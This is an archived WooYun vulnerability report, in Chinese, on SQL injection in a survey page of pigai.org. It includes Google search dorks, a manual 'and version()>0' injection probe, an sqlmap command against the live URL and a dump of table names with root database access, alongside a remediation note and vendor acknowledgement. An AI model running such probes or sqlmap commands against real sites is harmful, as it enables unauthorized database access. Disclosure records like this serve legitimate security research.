{"id": 52498, "wybug_id": "wooyun-2014-071047", "wybug_title": "句酷批改网某猥琐静态盲注root权限", "wybug_corp": "pigai.org", "wybug_author": "darkrerror", "wybug_date": "2014-08-05 12:28", "wybug_open_date": "2014-09-19 12:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向公众公开  简要描述： 其实我是来看厂商送什么礼物的。 详细说明：  看到厂商活动多，我就来了。当然是先信息收集了，看了下面这个注入。 WooYun: 句酷批改网主站sql注入漏洞 注入点参数是eid，于是我就利用google搜索了一下（ps：想捡个漏的什么的...）搜索：site:pigai.org inurl:eid 一看搜到8000多条数据，还是算了。重新搜了关键字site:pigai.org inurl:s -www -bbs搜到URL：http://vote.pigai.org/Home/index.php?s=/Qa/index/id/33手工检测s参数是否存在注入，发现总是这个App.class.php文件报错了\n\n提示并没有加载到该模块，于是就对加载的模块进行了手工检测，发现手工检测数据库类型为mysql：http://vote.pigai.org/Home/index.php?s=/Qa/index/id/33 and version()>0   漏洞证明：  SQLMAP证明：\n\n共影响29个数据库：sqlmap.py -u \"http://vote.pigai.org/Home/index.php?s=/Qa/index/id/33*\" --dbs\n\n当前数据库“qa”的的所有表：Database: qa+---------------------+| tb_fixdata_province || tb_fixdata_school   || tb_qa               || tb_qa_answer        || tb_qa_autosave      || tb_qa_logic         || tb_qa_logic_on      || tb_qa_number        || tb_qa_number_on     || tb_qa_question      || tb_qa_result_10     || tb_qa_result_11     || tb_qa_result_13     || tb_qa_result_15     || tb_qa_result_17     || tb_qa_result_18     || tb_qa_result_20     || tb_qa_result_21     || tb_qa_result_22     || tb_qa_result_25     || tb_qa_result_27     || tb_qa_result_29     || tb_qa_result_30     || tb_qa_result_31     || tb_qa_result_32     || tb_qa_result_33     || tb_qa_result_34     || tb_user             || tb_usertype         |+---------------------+数据库“root”权限：\n\n   修复方案：  构造SQL查询时，请使用参数化查询、验证输入对用户输入的数据进行全面安全检查或过滤，尤其注意检查是否包含HTML特殊字符。这些检查或过滤必须在服务器端完成，建议过滤的常见危险字符。ps:)跪求礼物啊！   版权声明：转载请注明来源 darkrerror@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-08-06 09:17 厂商回复： 感谢指出 礼物稍后奉上 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}